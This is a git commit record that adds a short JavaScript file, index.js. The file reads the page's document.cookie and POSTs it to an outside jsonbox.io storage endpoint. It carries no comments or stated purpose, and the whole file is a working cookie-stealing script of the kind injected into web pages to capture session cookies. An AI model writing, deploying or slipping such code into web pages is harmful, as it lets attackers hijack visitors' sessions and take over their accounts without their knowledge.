3ffb815c6108234b2aa8d95f80ab1a2c1e38e6b7
JoseMiguez98 <josemiguez184@gmail.com>
2020-08-30 02:18:12 -0300

    first commit

---
+++ index.js
@@ -0,0 +1,23 @@
+async function postData(url = '', data = {}) {
+  const response = await fetch(url, {
+    method: 'POST',
+    mode: 'cors',
+    cache: 'no-cache',
+    credentials: 'same-origin',
+    headers: {
+      'Content-Type': 'application/json; charset=utf-8'
+      // 'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    redirect: 'follow',
+    referrerPolicy: 'no-referrer',
+    body: JSON.stringify(data),
+  });
+  return response.json();
+}
+
+const cookie = document.cookie;
+
+postData('https://jsonbox.io/box_8f9a9772eb37b3694de8', { cookie })
+  .then(data => {
+  console.log(data);
+});
